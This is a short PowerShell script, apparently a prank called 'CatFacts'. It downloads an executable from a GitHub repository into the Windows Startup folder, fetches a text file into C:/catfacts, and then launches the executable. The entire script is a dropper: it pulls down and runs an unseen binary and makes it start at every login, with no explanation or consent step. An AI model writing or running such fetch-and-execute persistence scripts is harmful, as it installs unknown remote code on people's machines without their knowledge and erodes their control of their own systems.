Invoke-WebRequest -Uri "https://github.com/Excrement/CatFacts/raw/master/catfacts.exe" -OutFile "..\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\CatFacts.exe"
mkdir C:/catfacts
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Excrement/CatFacts/master/facts.txt" -OutFile "C:/catfacts/facts.txt"
cd "..\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
start catfacts.exe
